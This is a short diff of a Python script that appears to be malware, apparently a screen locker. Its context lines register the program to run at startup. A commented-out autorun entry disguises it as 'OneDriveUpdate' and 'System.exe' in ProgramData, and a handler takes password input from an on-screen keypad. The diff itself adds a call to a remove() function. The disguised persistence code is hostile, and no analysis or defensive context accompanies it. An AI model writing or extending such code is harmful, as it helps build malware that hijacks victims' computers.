@@ -24,6 +24,7 @@ count = 3
 file_path = os.getcwd() + "\\" + os.path.basename(sys.argv[0])
 #AddToAutorun("OneDriveUpdate", "C:\\ProgramData\\", "System.exe")
 startup(file_path)
+remove() 
 
 def buton(arg):
 	enter_pass.insert(END, arg)
